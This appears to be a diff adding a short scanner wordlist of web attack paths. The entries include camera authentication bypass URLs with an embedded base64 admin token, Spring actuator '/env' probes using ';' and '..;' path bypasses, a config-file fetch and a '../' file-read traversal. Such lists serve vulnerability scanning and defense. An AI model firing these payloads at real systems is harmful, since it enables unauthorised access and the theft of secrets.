@@ -1,0 +1,9 @@
+/System/configurationFile?auth=YWRtaW46MTEK
+/artemis/env
+/artemis-portal/artemis/env
+/artemis/actuator/env
+/artemis;/env;
+/artemis/1/..;/env
+/portal/conf/config.properties
+/onvif-http/snapshot?auth=YWRtaW46MTEK
+/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php
